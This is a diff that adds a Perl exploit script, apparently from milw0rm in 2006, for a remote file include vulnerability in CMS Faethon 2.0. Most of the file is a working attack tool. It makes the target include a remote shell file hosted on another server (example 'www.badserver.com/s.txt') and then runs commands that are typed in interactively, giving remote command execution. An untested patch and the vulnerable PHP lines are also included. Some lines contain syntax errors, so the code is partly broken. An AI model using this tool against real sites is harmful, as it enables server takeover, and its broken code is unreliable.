@@ -1,0 +1,146 @@
+#!/usr/bin/perl
+
+#####################################################################################################
+#                                                                                                   #
+# CMS Faethon 2.0 Ultimate                                                                          #
+#                                                                                                   #
+# Class:  Remote/Local File Include Vulnerability                                                   #
+#                                                                                                   #
+# Date:   2006/10/24                                                                                #
+#                                                                                                   #
+# Remote: Yes                                                                                       #
+#                                                                                                   #
+# Type:   Highly critical                                                                           #
+#                                                                                                   #
+# Vendor: www.cmsfaethon.org                                                                	    #
+#                                                                                                   #
+# Download: http://cmsfaethon.org/downloads/                                            	    #
+#                                                                                                   #
+# Note: Successful exploitation requires register_globals = on and magic_quotes_gpc = on            #
+#                                                                                                   #
+# Discovered & Exploit by: r0ut3r (writ3r [at] gmail.com)                                           #
+#                                                                                                   #
+# Exploit: cmsfaethon2_xpl.pl                                                                       #
+#                                                                                                   #
+# Vulnerable code config.php                                                                        #
+# require($mainpath . '../config.php');                                                             #
+#                                                                                                   #
+# Vulnerable code rss-reader.php                                                                    #
+# if(isset($_GET['rss'])) { $source = $_GET['rss']; }                                               #
+#                                                                                                   #
+# // include lastRSS                                                                                #
+# include($mainpath.'lib/class.lastrss.php');                                                       #
+# include($mainpath.'lib/functions_AutoCzech.php');                                                 #
+#                                                                                                   #
+# Comments:                                                                                         #
+# Whats happenin tgo.                                                                               #
+# Good lookin out with that last exploit too str0ke                                                 #
+#                                                                                                   #
+#####################################################################################################
+
+use LWP::UserAgent;
+use LWP::Simple
+
+$target = @ARGV[0];
+$shellsite = @ARGV[1];
+$shellcmd = @ARGV[2];
+$fileno = @ARGV[3];
+
+if(!$target || !$shellsite)
+{
+    usage();
+}
+
+header();
+
+if ($fileno eq 1)
+{
+    $file = "/admin/config.php?mainpath=";
+}
+elsif ($fileno eq 2)
+{
+    $file = "/includes/rss-reader.php?mainpath=";
+}
+else
+{
+    $file = "/admin/config.php?mainpath=";
+}
+
+if (@ARGV[5] eq "-p")
+    {
+    print q
+    {
+########################################################################
+            Apply the following code to both files below:
+1: admin/config.php
+2: includes/rss-reader.php
+
+if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))
+    die();
+
+NOTE: Patch hasn't been tested, but it should work. The code denies
+direct access to the files it is applied to.
+########################################################################
+    }
+    }
+
+print "Type 'exit' to quit";
+print "[cmd]\$";
+$cmd = <STDIN>;
+
+while ($cmd !~ "exit")
+{
+    $xpl = LWP::UserAgent->new() or die;
+        $req =
+HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'$shellcmd.'='.$cmd)
+or die("\n\n Failed to connect.");
+        $res = $xpl->request($req);
+        $r = $res->content;
+        $r =~ tr/[\n]/[&#234;]/;
+
+    if (@ARGV[4] eq "-r")
+    {
+        print $r;
+    }
+
+    print "[cmd]\$";
+    $cmd = <STDIN>;
+}
+
+sub header()
+{
+    print q
+    {
+########################################################################
+        CMS Faethon 2.0 Ultimate - Remote File Include Exploit
+            Vulnerability discovered and exploit by r0ut3r
+                        writ3r [at] gmail.com
+          For CMS Faethon administrator testing purposes only!
+########################################################################
+    };
+}
+
+sub usage()
+{
+    header();
+    print q
+    {
+########################################################################
+Usage:
+perl cmsfaethon2_xpl.pl <Target website> <Shell Location> <CMD Variable> <f> <-r> <-p>
+<Target Website> - Path to target eg: www.faethon.target.com
+<Shell Location> - Path to shell eg: www.badserver.com/s.txt
+<CMD Variable> - Shell command variable name eg: cmd
+<f> - Vulnerable file number, corresponding to:
+1: config.php
+2: rss-reader.php
+<r> - Show output from shell
+<p> - Display patch
+Example:
+perl cmsfaethon2_xpl.pl http://localhost http://localhost/s.txt cmd 1 -r -p
+########################################################################
+    };
+    exit();
+}
+
+# milw0rm.com [2006-10-24]
